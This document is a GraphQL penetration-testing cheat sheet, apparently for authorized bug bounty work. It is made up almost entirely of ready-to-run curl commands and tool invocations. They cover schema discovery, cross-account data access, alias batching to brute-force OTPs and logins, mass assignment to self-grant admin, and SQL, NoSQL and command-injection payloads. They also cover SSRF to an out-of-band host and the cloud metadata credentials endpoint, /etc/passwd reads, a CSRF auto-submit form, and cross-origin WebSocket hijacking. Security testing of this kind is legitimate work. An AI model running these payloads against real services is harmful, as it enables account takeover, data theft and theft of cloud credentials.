# GraphQL Attack Arsenal — Copy-Paste Queries, Introspection, Batching & Injection Probes

> Companion to `GRAPHQL_TESTING_GUIDE.md`. **Map the schema first, then drive each sink to impact.** Replace `target.com`, `<A_TOKEN>`/`<B_TOKEN>` (two test accounts), ids, and `YOUR.oast.fun` (your interactsh). **Authorized targets only; two accounts you own for BOLA; measured counts (don't brute real users); measure-don't-flood for DoS** (guide §24).
>
> **Workflow:** find + fingerprint endpoint (§3) → schema (introspection or clairvoyance, §5/§6) → BOLA/BFLA/batching/injection/SSRF → escalate.

---

## §0.0 — THE WHOLE ATTACK IN ONE SEQUENCE (copy top-to-bottom)
> The end-to-end chain in runnable order: **confirm → map schema → BOLA → batch-brute OTP → mass-assign → escalate**. Each block maps to a guide section and to a lettered section below for depth. Fill `G`, `A`/`B` tokens (two accounts you own), ids, and `YOUR.oast.fun`. Wire-level narrative = **guide Appendix D**.
```bash
# ── 0. SET ONCE ─────────────────────────────────────────────────────────────
export G=https://target.com/graphql
gql(){ curl -s "$G" -H 'Content-Type: application/json' "$@"; }
A='Authorization: Bearer <A_TOKEN>'; B='Authorization: Bearer <B_TOKEN>'   # two accounts you own

# ── 1. CONFIRM + FINGERPRINT (guide §3) ─────────────────────────────────────
gql -d '{"query":"{__typename}"}'                 # {"data":{"__typename":"Query"}} = GraphQL
graphw00f -d -f -t "$G"                            # engine → known quirks

# ── 2. MAP THE SCHEMA (§5 on / §6 off) ──────────────────────────────────────
gql -d '{"query":"{__schema{queryType{fields{name}} mutationType{fields{name}}}}"}'   # introspection ON: list Q+M
gql -d '{"query":"{ usr { id } }"}'               # OFF: 'Did you mean "user"?' suggestion leak → then:
#   clairvoyance -o schema.json -w wordlist.txt "$G"    # rebuild schema from suggestions
gql -d '{"query":"{__type(name:\"UpdateUserInput\"){inputFields{name}}}"}'   # mass-assign field list

# ── 3. BOLA — two-account, A's token + B's id (§7) ──────────────────────────
gql -H "$A" -d '{"query":"{ node(id:\"VXNlcjoxMjQ=\"){ ... on User { id email phone role } } }"}'
#   WIN = B's PII returned to A's session → BOLA. Alias a small range to show scale, then STOP.

# ── 4. BATCHING — bypass the per-request OTP/login limit (§9)  [the headline] ─
gql -d '{"query":"mutation{ a:verifyOtp(userId:\"7031\",code:\"000000\"){token} b:verifyOtp(userId:\"7031\",code:\"000001\"){token} c:verifyOtp(userId:\"7031\",code:\"000002\"){token} }"}'
#   Prove: N ops in ONE request where the limit is 1/5 → rate-limit bypass → brute → ATO (measured count = proof).

# ── 5. MASS ASSIGNMENT — self-promote via input object (§12) ─────────────────
gql -H "$A" -d '{"query":"mutation{ updateUser(input:{ id:ME, role:\"admin\", isAdmin:true }){ id role } }"}'
#   Read back; if role sticks → priv-esc → admin. REVERT after proof.

# ── 6. ESCALATE — injection / SSRF in args (§11/§16) ────────────────────────
gql -d '{"query":"query($f:JSON){ user(filter:$f){email} }","variables":{"f":{"$ne":null}}}'          # NoSQLi auth-bypass
gql -H "$A" -d '{"query":"mutation{ importFromUrl(url:\"http://YOUR.oast.fun/gql\"){id} }"}'           # SSRF OOB → metadata → cloud
#   → data dump / auth-bypass / cloud creds → RCE.

# ── 7. VALIDATE per sub-bug (§18) → severity by DOWNSTREAM class → PoC → dedup.
```
**Order rationale:** map first (everything hangs off the schema) → BOLA/batching are the highest-yield GraphQL-signature bugs → mass-assign/injection/SSRF are the escalators. Lead the report with the highest proven (ATO/RCE/cross-user); bundle introspection/errors as enablers.

---

## A0. GraphQL basics — read & send a query (newcomers; full primer in guide §2.0)
```bash
# 1) Is it GraphQL? (universal probe)
curl -s https://target.com/graphql -H 'Content-Type: application/json' -d '{"query":"{__typename}"}'
#    → {"data":{"__typename":"Query"}}  means yes.
# 2) A READ (query) with a variable:
curl -s https://target.com/graphql -H 'Content-Type: application/json' \
  -d '{"query":"query($id:ID!){ user(id:$id){ id email } }","variables":{"id":"123"}}'
# 3) A WRITE (mutation):
curl -s https://target.com/graphql -H 'Content-Type: application/json' \
  -d '{"query":"mutation{ updateEmail(email:\"x@test\"){ id } }"}'
```
- JSON body keys: **`query`** (GraphQL text) · **`variables`** (JSON inputs) · **`operationName`** (if several ops).
- **query** = read · **mutation** = write/state-change · **subscription** = live over WebSocket (§L).
- `field(arg: val)` → **arguments reach resolvers** (injection/IDOR live here). `a:field b:field` → **aliases** (batching).
- Roots are **Query / Mutation / Subscription**; **input** types are mutation argument objects (mass-assignment home).
- In **Burp**: send the POST to **Repeater**, edit the `query`. Use **Altair/GraphiQL** to explore with auto-complete, **InQL/Voyager** to see the schema map.

## A. Set once
```bash
export G=https://target.com/graphql
export A='Authorization: Bearer <A_TOKEN>'
export B='Authorization: Bearer <B_TOKEN>'
hdr(){ echo -H 'Content-Type: application/json' "$@"; }
gql(){ curl -s "$G" -H 'Content-Type: application/json' "$@"; }   # gql -H "$A" -d '{"query":"..."}'
```

## B. Confirm + fingerprint
```bash
gql -d '{"query":"{__typename}"}'                       # {"data":{"__typename":"Query"}} = GraphQL
graphw00f -d -f -t "$G"                                  # engine fingerprint (Apollo/Hasura/graphql-js/...)
python3 -m graphql_cop -t "$G"                           # quick audit: introspection/batching/CSRF/suggestions
# common paths if /graphql 404s:
for p in graphql api/graphql v1/graphql v2/graphql query gql graphql/console graphiql playground altair hasura/v1/graphql; do
  echo "== /$p"; curl -s -o /dev/null -w "%{http_code}\n" "https://target.com/$p"; done
```

## C. Introspection — full schema (§5)
```bash
gql -d '{"query":"query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } } } fragment FullType on __Type { kind name fields(includeDeprecated:true){ name args{ ...InputValue } type{ ...TypeRef } } inputFields{ ...InputValue } interfaces{ ...TypeRef } enumValues(includeDeprecated:true){ name } possibleTypes{ ...TypeRef } } fragment InputValue on __InputValue { name type{ ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType{ kind name ofType{ kind name ofType{ kind name } } } }"}' | tee schema.json
# Quick lists:
gql -d '{"query":"{__schema{queryType{fields{name}}}}"}'      # all queries
gql -d '{"query":"{__schema{mutationType{fields{name}}}}"}'   # all mutations  → BFLA candidates
gql -d '{"query":"{__type(name:\"User\"){fields{name}}}"}'    # a type's fields
gql -d '{"query":"{__type(name:\"UpdateUserInput\"){inputFields{name}}}"}'   # mass-assign fields
```

## D. Introspection OFF → suggestions / clairvoyance (§6)
```bash
# Field suggestion leak ("Did you mean ...") — misspell a field:
gql -d '{"query":"{ usr { id } }"}'           # → 'Did you mean "user"?'  (leaks real field names)
# Rebuild the schema via suggestions:
clairvoyance -o schema.json -w /usr/share/wordlists/graphql.txt "$G"
# Error-driven type leak:
gql -d '{"query":"{ user }"}'                 # "Field user of type User must have a selection of subfields"
```

## E. BOLA / IDOR — node(id) & *ById (§7)  (full method: IDOR kit)
```bash
# Global id encode/decode:
python3 -c "import base64;print(base64.b64encode(b'User:124').decode())"          # VXNlcjoxMjQ=
python3 -c "import base64;print(base64.b64decode('VXNlcjoxMjQ=').decode())"        # User:124
# A's token, B's object:
gql -H "$A" -d '{"query":"{ node(id:\"VXNlcjoxMjQ=\"){ ... on User { id email phone role } } }"}'
gql -H "$A" -d '{"query":"{ user(id:124){ email phone } order(id:8001){ total address } }"}'
# Nested traversal (relation resolver unchecked):
gql -H "$A" -d '{"query":"{ order(id:7001){ customer { email phone } } }"}'
```

## F. Alias enumeration / batching — brute & rate-limit bypass (§9)
```bash
# Alias enumeration (many objects, one request):
gql -H "$A" -d '{"query":"{ a:user(id:1){email} b:user(id:2){email} c:user(id:3){email} }"}'
# Alias brute (login/OTP) — one request, many attempts → per-request rate-limit bypassed:
gql -d '{"query":"mutation{ a:login(username:\"victim\",password:\"pass1\"){token} b:login(username:\"victim\",password:\"pass2\"){token} c:login(username:\"victim\",password:\"pass3\"){token} }"}'
# JSON-ARRAY batching (if the engine accepts an array of ops):
curl -s "$G" -H 'Content-Type: application/json' -d '[{"query":"mutation{login(username:\"v\",password:\"1\"){token}}"},{"query":"mutation{login(username:\"v\",password:\"2\"){token}}"}]'
# Proof = N attempts processed in ONE request where the per-request limit is 1/5 → bypass → ATO.
```

## G. Mutations / BFLA / mass assignment (§8/§12)
```bash
# Invoke a sensitive mutation as a LOW-priv user (A):
gql -H "$A" -d '{"query":"mutation{ updateUser(id:124,input:{email:\"victim+gql@your-inbox.test\"}){id email} }"}'
gql -H "$A" -d '{"query":"mutation{ deleteUser(id:124){ok} }"}'
# Mass assignment via input object (self-promote / cross-tenant):
gql -H "$A" -d '{"query":"mutation{ updateUser(input:{id:ME,role:\"admin\",isAdmin:true,emailVerified:true,owner_id:124}){id role} }"}'
# Discover input fields first:  __type(name:"UpdateUserInput"){inputFields{name}}   (§C)
```

## H. Injection through resolvers (§11)  — treat args like REST params
```bash
# SQLi in a filter/order arg (use variables for clean payloads):
gql -d '{"query":"query($f:String!){ users(filter:$f){id} }","variables":{"f":"'\'' OR 1=1-- -"}}'
gql -d '{"query":"{ users(orderBy:\"id;SELECT pg_sleep(5)--\"){id} }"}'          # time-based
# NoSQLi (Mongo) via typed variables:
gql -d '{"query":"query($id:JSON){ user(id:$id){email} }","variables":{"id":{"$ne":null}}}'
gql -d '{"query":"query($f:JSON){ user(filter:$f){email} }","variables":{"f":{"password":{"$regex":"^a"}}}}'
# OS command (time-based) in an export/convert/ping arg:
gql -d '{"query":"mutation{ export(format:\"pdf; sleep 10\"){url} }"}'
```

## I. SSRF / file read via resolver args (§16)
```bash
gql -H "$A" -d '{"query":"mutation{ importFromUrl(url:\"http://YOUR.oast.fun/gql\"){id} }"}'   # OOB confirm
gql -H "$A" -d '{"query":"mutation{ avatarFromUrl(url:\"http://169.254.169.254/latest/meta-data/iam/security-credentials/\"){ok} }"}'  # cloud metadata
gql -H "$A" -d '{"query":"{ file(path:\"/etc/passwd\"){content} }"}'                            # LFI/traversal
```

## J. DoS probes — MEASURE, do not flood (§10, with permission)
```bash
# Deep nesting (measure response time / complexity rejection — keep it ONE query):
gql -d '{"query":"{ user(id:1){ posts{ author{ posts{ author{ posts{ id } } } } } } }"}' -w ' time=%{time_total}\n'
# Alias overloading (repeat an expensive field):  a0:expensive b0:expensive ... (bounded)
# Field/__typename duplication; directive overload @skip(if:false) repeated.
# Report MISSING depth/complexity/cost limits or timeouts — don't take the service down.
```

## K. CSRF on GraphQL (§14)
```bash
# GET-based (if accepted) — cookie auth + no CSRF token = CSRF:
curl -s "$G?query=mutation%7BupdateEmail(email%3A%22victim%2Bgql%40your-inbox.test%22)%7Bid%7D%7D" -H 'Cookie: session=<victim>'
# form-urlencoded auto-submit (no preflight) PoC:
cat <<'HTML'
<form action="https://target.com/graphql" method="POST">
 <input name="query" value="mutation{updateEmail(email:&quot;victim+gql@your-inbox.test&quot;){id}}">
</form><script>document.forms[0].submit()</script>
HTML
```

## L. Subscriptions over WebSocket — CSWSH / auth bypass (§15.5)
```bash
# Connect with websocat (sub-protocol graphql-transport-ws / graphql-ws). Test (a) NO token, (b) FOREIGN Origin:
websocat -H='Origin: https://evil.example' 'wss://target.com/graphql' --protocol graphql-transport-ws
# then send these frames:
#   {"type":"connection_init","payload":{}}
#   {"type":"subscribe","id":"1","payload":{"query":"subscription{ messageAdded{ text user{ email } } }"}}
# WIN: cookie-auth + NO Origin check + connects/streams cross-origin  → CSWSH (CSRF-on-WebSocket).
#      OR a sensitive subscription resolves with no/low auth         → auth bypass.
# Also: open many subscriptions / never ack → connection-exhaustion DoS (measure, with permission).
```

## M. @defer / @stream amplification (DoS) + CrackQL batching (§10.6 / §9)
```bash
# Incremental-delivery directives (measure latency/complexity; PERMISSION required — don't flood):
gql -d '{"query":"{ users @stream(initialCount:0){ id } }"}'             # stream a huge list item-by-item
gql -d '{"query":"query{ me { ... @defer { email orders{ id } } } }"}'   # defer many fragments
# directive/parser overload: @skip(if:false) repeated; duplicate fields  __typename __typename ...
# CrackQL — alias-batch brute (creds / OTP / coupons) in ONE request, reports the bypass count:
crackql -t "$G" -q login.graphql -i creds.csv
```

## N. Validity checklist (paste per sub-bug) (§18)
```
BOLA           → two accounts: A's token + B's id returned B's data (IDOR proof).
BFLA/mass-assign → low-priv account performed/persisted a privileged change (read it back).
batching       → measured count: N ops succeeded in ONE request where limit is 1/5.
injection      → error/UNION/time-delta/OOB signal, reproducible.
SSRF           → interactsh OOB callback you control / metadata creds.
subscription   → CSWSH (cross-origin authed connect) / sensitive sub with no auth.
DoS            → measured latency/complexity amplification (permission); no sustained outage.
info-disc      → only if it leaks SQL/paths/PII that aids exploitation.
```

## O. Real-world GraphQL patterns & references
```
BOLA via node(id:) / userById       → cross-user PII / ATO (most common GraphQL bounty).
Alias / array batching              → login/OTP/2FA brute → rate-limit bypass → account takeover.
Mass assignment via input object    → set role/isAdmin → privilege escalation → admin → RCE.
SSRF via url-taking mutation        → cloud metadata → creds → cloud account/RCE.
Injection in filter/order args      → SQL/NoSQL → data dump / auth bypass.
Subscriptions / WebSocket (CSWSH)   → cookie-auth + no Origin check → live data theft cross-site.
Introspection + verbose errors      → schema & backend disclosure (enabler).
Learn: graphql.org/learn · PortSwigger GraphQL labs · DVGA (practice target).
Refs: OWASP GraphQL Cheat Sheet & API Top 10; PortSwigger GraphQL; InQL/graphw00f/clairvoyance/graphql-cop/CrackQL;
      CWE-639/285/862/915/89/943/918/352/770 + CSWSH.
```
